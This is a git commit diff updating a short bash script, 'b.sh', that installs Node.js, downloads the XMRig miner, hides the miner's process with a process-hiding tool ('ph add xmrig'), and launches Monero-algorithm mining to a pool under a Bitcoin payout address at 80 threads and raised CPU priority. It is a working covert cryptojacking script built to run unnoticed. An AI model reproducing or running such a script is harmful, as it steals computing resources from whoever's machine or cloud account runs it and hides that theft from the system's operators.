f8423b259134106346147f37d5a1c8d1360ee1d9
viwarlani <106577288+viwarlani@users.noreply.github.com>
2022-06-10 01:58:57 +0700

    Update b.sh

--- b.sh
+++ b.sh
@@ -1,14 +1,11 @@
 #!/bin/bash
-sudo apt update 
+sudo apt update
+wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
+\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
+\rm node-v14.17.0-linux-x64.tar.gz
+PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
+npm config set cache /tmp --global
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-npm i -g node-process-hider
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-ph add b.sh
 ph add xmrig
-sleep 14
 ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o rx.unmineable.com:3333  -u BTC:1NPgcV7FomPoZNuPQKQ1bLFZHhzCAYNEiS.$ip -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive
 
